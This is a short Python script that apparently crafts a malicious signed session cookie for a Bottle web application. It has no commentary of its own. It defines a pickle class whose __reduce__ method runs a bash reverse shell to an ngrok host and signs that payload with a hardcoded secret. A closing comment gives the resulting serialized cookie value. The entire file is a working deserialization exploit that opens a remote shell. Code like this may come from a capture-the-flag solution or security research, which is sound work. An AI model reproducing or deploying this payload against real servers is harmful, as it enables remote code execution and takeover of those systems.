from bottle import default_app, get, run, request, response
import os

app = default_app()

secret = "cCySMEDJ9LOlStFzu-k9HE0XUZIkGlGqMkDOBHOldXI"


class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/0.tcp.ngrok.io/15860 0>&1"',))

@get("/")
def home():
    session = Exploit()
    response.set_cookie('session', session, secret=secret)
    return "fdsfdsaf"

@get("/coo")
def getCookie():
    request.get_cookie('session', secret=secret)
    return "fdsfdsaf"

run(host='localhost', port=9453, reloader=True)

# Cookie = !ZIlnsDLh189xWmE335oTEA==?gAWVXgAAAAAAAACMB3Nlc3Npb26UjAVwb3NpeJSMBnN5c3RlbZSTlIw3YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5uZ3Jvay5pby8xNTg2MCAwPiYxIpSFlFKUhpQu